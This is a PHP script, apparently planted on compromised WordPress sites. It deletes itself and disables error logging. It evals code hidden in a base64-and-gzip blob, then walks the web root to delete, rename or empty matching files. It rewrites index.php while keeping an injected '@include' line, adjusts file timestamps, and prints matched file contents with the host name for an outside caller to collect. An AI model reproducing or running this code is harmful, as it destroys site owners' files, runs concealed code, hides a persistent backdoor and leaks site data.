<?php unlink(__FILE__); 
@ini_set("error_log", NULL);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@set_time_limit(0);

$defs = unserialize(gzinflate(base64_decode("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")));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE) {
        return $_SERVER['DOCUMENT_ROOT'];
    } elseif ($docroot_end === 0) {
        return "/";
    } else {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function rglob($pattern, $flags = 0, $depth = 15)
{
    if ($depth < 1) {
        return array();
    }
    $files = glob($pattern, $flags | GLOB_BRACE);
    if (empty($files)) {
        $files = array();
    }

    $dirs = glob(dirname($pattern) . '/{,.}*', GLOB_ONLYDIR | GLOB_NOSORT | GLOB_BRACE);

    if (!empty($dirs)) {
        foreach ($dirs as $dir) {
            if (strrpos($dir, ".") === (strlen($dir) - 1)){continue;}
            $files = array_merge($files, rglob($dir . '/' . basename($pattern), $flags, $depth - 1));
        }
    }

    return $files;
}

function replace_by_markers($content, $start_marker, $end_marker, $replace_for = "", $search_pattern = "")
{
    $replace = "";
    $end_marker_pos = 0;

    if (is_array($content))
    {
        exit("BAD RULE");
    }

    for ($i=0; $i<=10; $i++) {

        $start_marker_pos = strpos($content, $start_marker, $end_marker_pos);
        if ($start_marker_pos === FALSE)
        {
            break;
        }

        $end_marker_pos = strpos($content, $end_marker, $start_marker_pos + strlen($start_marker));

        if ($end_marker_pos === FALSE) {
            break;
        }

        $end_marker_pos += strlen($end_marker);
        $replace = substr($content, $start_marker_pos, $end_marker_pos - $start_marker_pos);

        if (empty($search_pattern) || (!empty($search_pattern) && strpos($replace, $search_pattern) !== FALSE)) {
            $content = str_replace($replace, $replace_for, $content);
            $end_marker_pos = 0;
        }
    }

    return array($replace, $content);
}

function fix_index($docroot)
{
    $path = $docroot . "/index.php";
    $orig_index = rawurldecode("%3C%3Fphp%0A%0Adefine%28%20%27WP_USE_THEMES%27%2C%20true%20%29%3B%0A%0Arequire%28%20dirname%28%20__FILE__%20%29%20.%20%27%2Fwp-blog-header.php%27%20%29%3B%0A");
    $content = @file_get_contents($path);

    preg_match("/\/\*[a-f0-9]*\*\/\r?\n\r?\n\@include.*\r?\n\r?\n\/\*[a-f0-9]*\*\//", $content, $matches);
    $new_content = $orig_index;
    if (!empty($matches)) {
        $new_content = str_replace("?php", "?php\n\n" . $matches[0], $new_content);
    }

    @chmod($path, 0755);
    @file_put_contents($path, $new_content);
    @touch($path, time() + 120);
    @chmod($path, 0644);
}

foreach ($defs as $rule_group_id => $rule_group) {
foreach ($rule_group["rules"] as $def_item) {
            $match_func_def = sprintf("function match_%s(\$content, \$content_lower, \$path){%s}", $def_item[0], $def_item[1]);
            $clean_func_def = sprintf("function clean_%s(\$path){%s}", $def_item[0], $def_item[2]);

            eval($match_func_def);
            eval($clean_func_def);
}
}

$res = array("stats" => array(), "samples_path" => array(), "samples" => array());
$docroot = GetDocRoot();

foreach ($defs as $rule_group_id => $rule_group) {
    foreach (rglob($docroot . $rule_group["param"], 0, $rule_group["depth"]) as $path) {
        $fsize = @filesize($path);
        $content = @file_get_contents($path);

        if (empty($content))
        {
            if (strpos($path, $docroot . "/index.php") !== FALSE) {
                fix_index($docroot);
            }
            continue;
        }

        $content_lower = strtolower($content);

        //$content_norm = str_replace("\t", "", str_replace(" ", "", strtolower($content)));
        foreach ($rule_group["rules"] as $def_item) {

            if (call_user_func(sprintf("match_%s", $def_item[0]), $content, $content_lower, $path)) {
                if (!array_key_exists($def_item[0], $res["stats"])) {
                    $res["stats"][$def_item[0]] = 0;
                    $res["samples_path"][$def_item[0]] = "";
                    $res["samples"][$def_item[0]] = array(urlencode($content), substr($path, strlen($docroot)) . ":" . $_SERVER["HTTP_HOST"]);
                }

                $res["stats"][$def_item[0]] += 1;
                if (strlen($res["samples_path"][$def_item[0]]) < 500) {
                    $res["samples_path"][$def_item[0]] .= (substr($path, strlen($docroot)) . ":" . $fsize . ":" . $_SERVER["HTTP_HOST"] . "\n");
                }

                if (strpos($path, $docroot . "/index.php") !== FALSE) {
                    if (is_dir($docroot . "/wp-admin/") && is_dir($docroot . "/wp-content/") && (filesize($docroot . "/index.php") > 1024 || substr_count($content, "?php") > 1)) {
                        fix_index($docroot);
                        break;
                    }
                }

                $action = call_user_func(sprintf("clean_%s", $def_item[0]), $path);

                if ($action === "rename") {
                    @chmod($path, 0777);
                    if (!@rename($path, $path . ".suspected")) {
                        @unlink($path);
                        break;
                    }
                }
                elseif ($action === "delete") {
                    @chmod($path, 0777);
                    @unlink($path);
                    break;
                }
                elseif ($action === "empty") {
                    @chmod($path, 0755);
                    @file_put_contents($path, "");
                    @chmod($path, 0644);
                    @touch($path);
                    break;
                }
                else
                {
                    $fsize = @filesize($path);
                    $content = @file_get_contents($path);
                    $content_lower = strtolower($content);
                }
            }
        }
        unset($content);
    }
}
echo "jrndbyvrchexcs";
echo base64_encode(serialize($res));
echo "jrndbyvrchexcs";
exit();